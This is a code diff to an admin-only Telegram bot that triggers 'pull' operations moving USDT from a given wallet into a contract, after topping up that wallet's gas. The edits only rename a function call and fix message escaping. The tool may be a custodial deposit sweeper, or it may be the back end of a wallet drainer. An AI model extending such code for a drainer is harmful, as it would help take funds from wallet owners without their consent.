@@ -676,6 +676,8 @@ Failed to fetch wallet list. Please try again later.
         }
     }
 
+    // In the handlePullCommand method, fix the contract service call:
+
     async handlePullCommand(chatId, walletAddress) {
         if (chatId.toString() !== this.adminChatId) {
             return this.bot.sendMessage(chatId, '❌ Unauthorized access');
@@ -692,13 +694,13 @@ Failed to fetch wallet list. Please try again later.
 🔄 <b>Pull Operation Initiated</b>
 Wallet: <code>${maskedAddress}</code>
 
-Processing\.\.\. This will:
-1\. Check wallet gas balance
-2\. Send gas if needed
-3\. Pull USDT to contract
-4\. Send confirmation
+Processing... This will:
+1. Check wallet gas balance
+2. Send gas if needed
+3. Pull USDT to contract
+4. Send confirmation
 
-⏳ <b>Please wait</b>\.\.\.
+⏳ <b>Please wait</b>...
         `;
 
         const options = {
@@ -767,8 +769,8 @@ Error: ${this.escapeMarkdown((gasResult && gasResult.error) ? gasResult.error : 
                 }
             }
 
-            // Pull USDT from wallet to contract
-            const pullResult = await contractService.pull(walletAddress);
+            // Pull USDT from wallet to contract - USE THE CORRECT FUNCTION NAME
+            const pullResult = await contractService.pullUSDTFromWallet(walletAddress);
 
             if (pullResult && pullResult.success) {
                 const escapedAmount = this.escapeMarkdown(pullResult.amount || '0');
@@ -866,6 +868,7 @@ Error: ${this.escapeMarkdown(error && error.message ? error.message : String(err
             return this.bot.sendMessage(chatId, `❌ Error: ${error && error.message ? error.message : String(error)}`);
         }
     }
+
 
     async handleWithdrawCommand(chatId) {
         if (chatId.toString() !== this.adminChatId) {
@@ -1199,5 +1202,6 @@ Error: ${cleanErrorMessage}
 }
 
 module.exports = new TelegramService();
+
 
 
